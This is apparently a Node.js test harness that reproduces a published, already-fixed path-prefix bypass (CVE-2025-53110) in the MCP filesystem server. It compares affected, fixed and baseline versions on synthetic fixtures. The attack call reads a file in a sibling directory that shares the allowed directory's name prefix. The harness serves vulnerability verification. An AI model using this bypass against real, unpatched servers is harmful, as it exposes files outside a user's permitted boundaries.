// CVP Stage 2 - CVE-2025-53110 allowed-directory prefix-collision bypass.
// Drives the REAL packaged MCP filesystem server over stdio at each version
// against ONE identical set of synthetic fixtures, and captures raw evidence.
//
// This reproduces a PUBLISHED, already-fixed vulnerability (Cymulate "EscapeRoute",
// researcher Elad Beber; CVE-2025-53110 / GHSA-hc55-p739-j48w). It is calibration,
// NOT an original discovery.

import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { z } from "zod";

// Permissive tools/list result schema: the current client otherwise strictly
// validates each tool's inputSchema, which older servers render differently.
// We only need the tool NAMES, so we accept whatever each server reports.
const LooseToolsResult = z
  .object({ tools: z.array(z.object({ name: z.string() }).passthrough()) })
  .passthrough();
import fs from "node:fs";
import fsp from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import crypto from "node:crypto";
import { spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const CASE_ROOT = path.resolve(HERE, "..");
const EVIDENCE = path.join(CASE_ROOT, "evidence");

// Distinctive marker bases; each run appends a random nonce so a leaked value
// cannot be a cached or hardcoded constant — it must have been read from the
// fixture file created this run. The full markers are recorded in run-env.json
// and the assertions read them from there (not hardcoded).
const MARKER_BASE = {
  inside: "CVP_INSIDE_ALLOWED_53110",
  secret: "CVP_SECRET_SIBLING_OUTSIDE_53110",
  far: "CVP_FAR_OUTSIDE_CONTROL_53110",
};

const SERVERS = [
  { role: "affected", expectVulnerable: true, dist: serverDist("affected") },
  { role: "fixed", expectVulnerable: false, dist: serverDist("fixed") },
  { role: "baseline", expectVulnerable: false, dist: serverDist("baseline") },
];

function serverDist(role) {
  return path.join(
    CASE_ROOT, "servers", role,
    "node_modules", "@modelcontextprotocol", "server-filesystem", "dist", "index.js",
  );
}

function sha256(buf) {
  return crypto.createHash("sha256").update(buf).digest("hex");
}

function textOf(result) {
  if (!result || !Array.isArray(result.content)) return "";
  return result.content
    .filter((c) => c && c.type === "text" && typeof c.text === "string")
    .map((c) => c.text)
    .join("");
}

async function makeFixtures() {
  const root = await fsp.mkdtemp(path.join(os.tmpdir(), "cvp-stage2-53110-"));
  const nonce = crypto.randomBytes(6).toString("hex");
  const markers = {
    inside: `${MARKER_BASE.inside}_${nonce}`,
    secret: `${MARKER_BASE.secret}_${nonce}`,
    far: `${MARKER_BASE.far}_${nonce}`,
  };
  const allowed = path.join(root, "workspace");
  const sibling = path.join(root, "workspace_secret"); // shares the "workspace" prefix, NOT a child
  const farOutside = path.join(root, "far_outside"); // no shared prefix (negative control)
  await fsp.mkdir(allowed);
  await fsp.mkdir(sibling);
  await fsp.mkdir(farOutside);
  const insideFile = path.join(allowed, "inside.txt");
  const secretFile = path.join(sibling, "secret.txt");
  const farFile = path.join(farOutside, "other.txt");
  await fsp.writeFile(insideFile, markers.inside);
  await fsp.writeFile(secretFile, markers.secret);
  await fsp.writeFile(farFile, markers.far);

  // Prove the sibling is genuinely OUTSIDE the allowed directory: its only
  // relationship to `allowed` is the shared leading string.
  const rel = path.relative(allowed, sibling);
  const siblingIsChild = !rel.startsWith("..") && !path.isAbsolute(rel);
  const sharesStringPrefix = sibling.startsWith(allowed);

  return {
    root, allowed, sibling, farOutside, insideFile, secretFile, farFile, nonce, markers,
    containment_facts: {
      sibling_is_child_of_allowed: siblingIsChild, // must be false
      sibling_shares_string_prefix: sharesStringPrefix, // must be true
      far_outside_shares_prefix: farOutside.startsWith(allowed), // must be false
    },
    marker_hashes: {
      inside: sha256(markers.inside), secret: sha256(markers.secret), far: sha256(markers.far),
    },
  };
}

function pickReadTool(toolNames) {
  // Prefer read_file: it exists in ALL three versions, so the SAME tool and
  // SAME arguments drive every server and version stays the only variable.
  if (toolNames.includes("read_file")) return "read_file";
  if (toolNames.includes("read_text_file")) return "read_text_file";
  throw new Error("No read_file/read_text_file tool exposed by server");
}

async function callRaw(client, name, args) {
  const request = { tool: name, arguments: args };
  try {
    const result = await client.callTool({ name, arguments: args });
    return { request, result, threw: false };
  } catch (err) {
    return {
      request,
      result: null,
      threw: true,
      error: { name: err?.name, message: err?.message, code: err?.code },
    };
  }
}

async function runOneServer(server, fx) {
  if (!fs.existsSync(server.dist)) {
    throw new Error(`Server dist not found for ${server.role}: ${server.dist}`);
  }
  const stderrChunks = [];
  const transport = new StdioClientTransport({
    command: process.execPath,
    args: [server.dist, fx.allowed], // single allowed directory = the workspace fixture
    stderr: "pipe",
  });
  const client = new Client(
    { name: "cvp-stage2-client", version: "0.0.0" },
    { capabilities: {} },
  );
  await client.connect(transport);
  if (transport.stderr) {
    transport.stderr.on("data", (d) => stderrChunks.push(d.toString()));
  }

  const serverInfo = client.getServerVersion?.() ?? null;
  const toolsList = await client.request({ method: "tools/list" }, LooseToolsResult);
  const toolNames = toolsList.tools.map((t) => t.name);
  const readTool = pickReadTool(toolNames);

  const allowedReport = await callRaw(client, "list_allowed_directories", {});
  const attack = await callRaw(client, readTool, { path: fx.secretFile }); // CVE-2025-53110
  const controlInside = await callRaw(client, readTool, { path: fx.insideFile }); // must succeed
  const controlFar = await callRaw(client, readTool, { path: fx.farFile }); // must be denied

  await client.close();
  await new Promise((r) => setTimeout(r, 50)); // let stderr flush

  const attackText = textOf(attack.result);
  const insideText = textOf(controlInside.result);
  const farText = textOf(controlFar.result);

  const observations = {
    attack_isError: attack.result?.isError === true || attack.threw,
    attack_returned_secret: attackText === fx.markers.secret,
    attack_text: attackText,
    control_inside_isError: controlInside.result?.isError === true || controlInside.threw,
    control_inside_returned_marker: insideText === fx.markers.inside,
    control_far_isError: controlFar.result?.isError === true || controlFar.threw,
    control_far_returned_marker: farText === fx.markers.far,
  };

  // Behavior classification.
  const vulnerable_behavior_observed =
    !observations.attack_isError && observations.attack_returned_secret;
  const patched_behavior_observed =
    observations.attack_isError && !observations.attack_returned_secret;
  const controls_ok =
    !observations.control_inside_isError &&
    observations.control_inside_returned_marker &&
    observations.control_far_isError &&
    !observations.control_far_returned_marker;

  const expectation_met = server.expectVulnerable
    ? vulnerable_behavior_observed && controls_ok
    : patched_behavior_observed && controls_ok;

  return {
    role: server.role,
    expectVulnerable: server.expectVulnerable,
    server_package_version: readServerVersion(server.role),
    server_info: serverInfo,
    launched_allowed_dir: fx.allowed,
    read_tool_used: readTool,
    tool_names: toolNames,
    requests: {
      list_allowed_directories: allowedReport,
      attack_read_sibling_secret: attack,
      control_read_inside: controlInside,
      control_read_far_outside: controlFar,
    },
    server_stderr: stderrChunks.join(""),
    observations,
    classification: {
      vulnerable_behavior_observed,
      patched_behavior_observed,
      controls_ok,
      expectation_met,
    },
  };
}

function readServerVersion(role) {
  try {
    const p = path.join(
      CASE_ROOT, "servers", role,
      "node_modules", "@modelcontextprotocol", "server-filesystem", "package.json",
    );
    return JSON.parse(fs.readFileSync(p, "utf8")).version;
  } catch {
    return null;
  }
}

function npmVersion() {
  try {
    // Single command string with shell: avoids the DEP0190 warning and runs
    // npm.cmd correctly on Windows (Node 24 requires a shell for .cmd).
    const r = spawnSync("npm --version", { shell: true, encoding: "utf8" });
    if (r.status === 0 && r.stdout) return r.stdout.trim();
  } catch {
    /* ignore */
  }
  return null;
}

async function main() {
  await fsp.mkdir(EVIDENCE, { recursive: true });
  await fsp.mkdir(path.join(EVIDENCE, "raw"), { recursive: true });

  const clientScript = fs.readFileSync(fileURLToPath(import.meta.url));
  const fx = await makeFixtures();

  const env = {
    captured_at_iso: new Date().toISOString(),
    node: process.version,
    npm: npmVersion(),
    os: `${os.type()} ${os.release()} ${os.arch()}`,
    platform: process.platform,
    host_note: "John's CVP work machine (Windows 11).",
    sdk_version: readHarnessSdkVersion(),
    client_script_sha256: sha256(clientScript),
    fixtures: {
      root: fx.root,
      allowed_directory: fx.allowed,
      sibling_outside: fx.sibling,
      far_outside: fx.farOutside,
      files: { inside: fx.insideFile, secret: fx.secretFile, far: fx.farFile },
      nonce: fx.nonce,
      markers: fx.markers,
      marker_hashes: fx.marker_hashes,
      containment_facts: fx.containment_facts,
    },
  };

  const results = [];
  for (const server of SERVERS) {
    process.stderr.write(`\n[run] ${server.role} (${readServerVersion(server.role)}) ...\n`);
    const r = await runOneServer(server, fx);
    results.push(r);
    await fsp.writeFile(
      path.join(EVIDENCE, "raw", `${server.role}.json`),
      JSON.stringify({ env_ref: "run-env.json", ...r }, null, 2),
    );
  }

  // Prove fixtures were not mutated by any run (reads only) -> "version is the only variable".
  const post = {
    inside: sha256(await fsp.readFile(fx.insideFile)),
    secret: sha256(await fsp.readFile(fx.secretFile)),
    far: sha256(await fsp.readFile(fx.farFile)),
  };
  const fixtures_unchanged =
    post.inside === fx.marker_hashes.inside &&
    post.secret === fx.marker_hashes.secret &&
    post.far === fx.marker_hashes.far;

  // Only-variable-is-version check: all values below are COMPUTED from the per-run
  // records (not asserted true by fiat), so the check is evidence, not a tautology.
  const readTools = new Set(results.map((r) => r.read_tool_used));
  const attackArgs = new Set(
    results.map((r) => JSON.stringify(r.requests.attack_read_sibling_secret.request.arguments)),
  );
  const allowedDirs = new Set(results.map((r) => r.launched_allowed_dir));
  const fixtureSigs = new Set(
    results.map((r) =>
      JSON.stringify({
        attack: r.requests.attack_read_sibling_secret.request.arguments,
        inside: r.requests.control_read_inside.request.arguments,
        far: r.requests.control_read_far_outside.request.arguments,
      }),
    ),
  );
  const only_variable_is_version = {
    client_script_sha256: env.client_script_sha256, // one script (one process) drove all servers
    same_allowed_directory: allowedDirs.size === 1,
    same_fixture_request_paths: fixtureSigs.size === 1,
    fixtures_unchanged,
    same_read_tool: readTools.size === 1,
    read_tools_seen: [...readTools],
    same_attack_arguments: attackArgs.size === 1,
  };

  const affected = results.find((r) => r.role === "affected");
  const fixed = results.find((r) => r.role === "fixed");
  const baseline = results.find((r) => r.role === "baseline");

  const overall_pass =
    results.every((r) => r.classification.expectation_met) &&
    fixtures_unchanged &&
    only_variable_is_version.same_allowed_directory &&
    only_variable_is_version.same_fixture_request_paths &&
    only_variable_is_version.same_read_tool &&
    only_variable_is_version.same_attack_arguments;

  const summary = {
    case_id: "STAGE2-53110",
    kind: "published_vulnerability_reproduction_calibration",
    not_original_discovery: true,
    cve: "CVE-2025-53110",
    ghsa: "GHSA-hc55-p739-j48w",
    credit: "Elad Beber (Cymulate), 'EscapeRoute' research",
    fix_commit: "cc99bdab",
    versions: {
      affected: affected?.server_package_version,
      fixed: fixed?.server_package_version,
      baseline: baseline?.server_package_version,
    },
    per_version_verdict: results.map((r) => ({
      role: r.role,
      version: r.server_package_version,
      expected: r.expectVulnerable ? "vulnerable" : "patched",
      vulnerable_behavior_observed: r.classification.vulnerable_behavior_observed,
      patched_behavior_observed: r.classification.patched_behavior_observed,
      controls_ok: r.classification.controls_ok,
      expectation_met: r.classification.expectation_met,
    })),
    only_variable_is_version,
    fixtures_unchanged,
    overall_pass,
  };

  await fsp.writeFile(path.join(EVIDENCE, "run-env.json"), JSON.stringify(env, null, 2));
  await fsp.writeFile(path.join(EVIDENCE, "results.json"), JSON.stringify(summary, null, 2));

  // Clean up the temp fixtures; their contents are recorded in run-env.json.
  await fsp.rm(fx.root, { recursive: true, force: true });

  process.stderr.write("\n" + JSON.stringify(summary, null, 2) + "\n");
  process.stderr.write(`\n[verdict] overall_pass = ${overall_pass}\n`);
  process.exit(overall_pass ? 0 : 1);
}

function readHarnessSdkVersion() {
  try {
    const p = path.join(HERE, "node_modules", "@modelcontextprotocol", "sdk", "package.json");
    return JSON.parse(fs.readFileSync(p, "utf8")).version;
  } catch {
    return null;
  }
}

main().catch((e) => {
  process.stderr.write(`\n[fatal] ${e?.stack || e}\n`);
  process.exit(2);
});
